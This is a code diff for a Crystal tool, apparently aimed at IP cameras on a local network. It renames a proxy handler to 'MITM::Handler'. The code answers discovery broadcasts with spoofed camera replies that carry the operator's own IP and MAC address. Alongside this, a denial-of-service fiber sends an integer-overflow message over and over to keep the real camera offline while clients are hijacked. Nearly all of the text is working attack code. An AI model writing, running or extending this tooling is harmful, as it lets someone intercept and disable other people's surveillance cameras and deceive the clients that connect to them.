@@ -1,13 +1,13 @@
 module XET::App
   module Error
-    abstract class Proxy::Handler < XET::Error
-      class AlreadyListening < Proxy::Handler
+    abstract class MITM::Handler < XET::Error
+      class AlreadyListening < MITM::Handler
       end
     end
   end
 end
 
-class XET::App::Proxy::Handler
+class XET::App::MITM::Handler
   # What needs to happen:
   # Client sends out broadcast Network::Common::Request
   # Cameras send out broadcast Network::Common::Reply
@@ -69,7 +69,7 @@ class XET::App::Proxy::Handler
     @discovery_socket = XET::Socket::UDP.new(XET::App.broadcast_ip, @port)
     refresh_socket
     stop
-    Log.info { "Proxy::Handler: Bound to #{XET::App.bind_ip} on #{@port}" }
+    Log.info { "MITM::Handler: Bound to #{XET::App.bind_ip} on #{@port}" }
   end
 
   private def make_netcom_reply_hash(netcom_reply : XET::Command::Network::Common::Reply) : UInt64
@@ -88,35 +88,31 @@ class XET::App::Proxy::Handler
   def start
     if @discovery_socket.closed?
       refresh_socket
-      Log.info { "Proxy::Handler: Starting listening on #{port}" }
+      Log.info { "MITM::Handler: Starting listening on #{port}" }
       _spawn_discovery_fiber
       _spawn_main_fiber
     else
-      raise XET::App::Error::Proxy::Handler::AlreadyListening.new
+      raise XET::App::Error::MITM::Handler::AlreadyListening.new
     end
   end
 
   private def _spawn_discovery_fiber
-    spawn(name: "XET::App::Proxy::Handler -> Listen Fiber") do
+    spawn(name: "XET::App::MITM::Handler -> Listen Fiber") do
       until @discovery_socket.closed?
         begin
+          @discovery_socket.send XET::Command::Network::Common::Request.new
           ip_and_msg = @discovery_socket.receive_message
           incoming_ip, xmsg = ip_and_msg[1], ip_and_msg[0]
           if xmsg.id == XET::Command::Network::Common::Request::ID
-            if netcom_request = XET::Command::Network::Common::Request.from_msg?(xmsg)
-              @netcom_request_channel.send incoming_ip
-            end
+            spawn { @netcom_request_channel.send incoming_ip } if netcom_request = XET::Command::Network::Common::Request.from_msg?(xmsg)
           elsif xmsg.id == XET::Command::Network::Common::Reply::ID
-            if netcom_reply = XET::Command::Network::Common::Reply.from_msg?(xmsg)
-              @netcom_reply_channel.send netcom_reply
-            end
+            spawn { @netcom_reply_channel.send netcom_reply } if netcom_reply = XET::Command::Network::Common::Reply.from_msg?(xmsg)
           end
         rescue e : XET::Error::Command::CannotParse
           # We can't parse the message.
         rescue e : XET::Error::Receive::Timeout
         rescue e : XET::Error::Receive
-          if e.is_a?(XET::Error::Receive::Timeout)
-          else
+          unless e.is_a?(XET::Error::Receive::Timeout)
             Log.info { "#{Fiber.current.name}: Listener on #{@port} had an exception: #{e}" }
           end
         rescue e : XET::Error::Socket::Closed
@@ -132,7 +128,7 @@ class XET::App::Proxy::Handler
   end
 
   private def _spawn_clients_fiber
-    spawn(name: "XET::App::Proxy::Handler -> Client Fiber") do
+    spawn(name: "XET::App::MITM::Handler -> Client Fiber") do
       until @netcom_request_channel.closed?
         begin
           client_ip = @netcom_request_channel.receive
@@ -160,7 +156,7 @@ class XET::App::Proxy::Handler
   end
 
   private def _spawn_cameras_fiber
-    spawn(name: "XET::App::Proxy::Handler -> Camera Fiber") do
+    spawn(name: "XET::App::MITM::Handler -> Camera Fiber") do
       until @netcom_reply_channel.closed?
         found_cameras = {} of UInt64 => XET::Command::Network::Common::Reply
         begin
@@ -219,19 +215,24 @@ class XET::App::Proxy::Handler
   end
 
   private def _spawn_client_hijack_fiber(netcom_reply : XET::Command::Network::Common::Reply)
-    # Modify the network reply so we can start spoofing it
-    spoofed_netcom_reply = XET::Command::Network::Common::Reply.new
-    spoofed_netcom_reply.config = netcom_reply.config.dup
-    Log.info { "Spoofing camera #{netcom_reply.config.serial_number} with address #{XET::App.server_ip}" }
-    spoofed_netcom_reply.config.host_ip = ::Socket::IPAddress.new(XET::App.server_ip, 0)
-    spoofed_netcom_reply.config.mac = XET::App.mac_address
-    spoofed_netcom_reply.build_message!
-
     stop_dos_channel = Channel(Bool).new
     stop_spoof_channel = Channel(Bool).new
 
-    spawn(name: "XET::App::Proxy::Handler -> Camera DoS Fiber #{netcom_reply.config.host_ip.as(::Socket::IPAddress).address}") do
+    # Modify the network reply so we can start spoofing it
+    spoofed_netcom_reply = XET::Command::Network::Common::Reply.new
+    # Copy over the netcom reply's config object 
+    spoofed_netcom_reply.config = netcom_reply.config.dup
+    Log.info { "Spoofing camera #{netcom_reply.config.serial_number} with address #{XET::App.server_ip}" }
+    # Set our ip and mac address to our information.
+    # TODO: Check if this actually matters lol.
+    spoofed_netcom_reply.config.host_ip = ::Socket::IPAddress.new(XET::App.server_ip, 0)
+    spoofed_netcom_reply.config.mac = XET::App.mac_address
+
+    spoofed_netcom_reply.build_message!
+
+    spawn(name: "XET::App::MITM::Handler -> Camera DoS Fiber #{netcom_reply.config.host_ip.as(::Socket::IPAddress).address}") do
       Log.info { "#{Fiber.current.name}: Starting DOS" }
+
       dos_socket = XET::Socket::TCP.new(netcom_reply.config.host_ip.as(::Socket::IPAddress).address, netcom_reply.config.tcp_port.as(UInt16).to_i)
       until stop_spoof_channel.closed? || dos_socket.closed?
         select
@@ -242,7 +243,6 @@ class XET::App::Proxy::Handler
           dos_socket.send_message XET::Command::DoS::SizeIntOverflow.new
         end
       end
-
     rescue e : XET::Error::Socket::ConnectionRefused | XET::Error::Send::BrokenPipe
       Log.info { "#{Fiber.current.name}: #{e.inspect} Sleeping for 10 seconds" }
       # Do nothing because we want to continue the DoS campaign the moment the camera comes up incase the client doesn't reattempt a search within two minutes.
@@ -252,7 +252,7 @@ class XET::App::Proxy::Handler
       raise e
     end
 
-    spawn(name: "XET::App::Proxy::Handler -> Spoof Broadcast Fiber #{netcom_reply.config.serial_number}") do
+    spawn(name: "XET::App::MITM::Handler -> Spoof Broadcast Fiber #{netcom_reply.config.serial_number}") do
       Log.info { "#{Fiber.current.name}: Starting Spoof Broadcast" }
       until stop_spoof_channel.closed? || @discovery_socket.closed?
         begin
@@ -262,7 +262,6 @@ class XET::App::Proxy::Handler
           when timeout 200.milliseconds
             begin
               @discovery_socket.send_message spoofed_netcom_reply
-              # TODO:  WRITE A BETTER WAY TO STOP THIS
             rescue e
               Log.error { "#{Fiber.current.name}: #{e.inspect}" }
               raise e
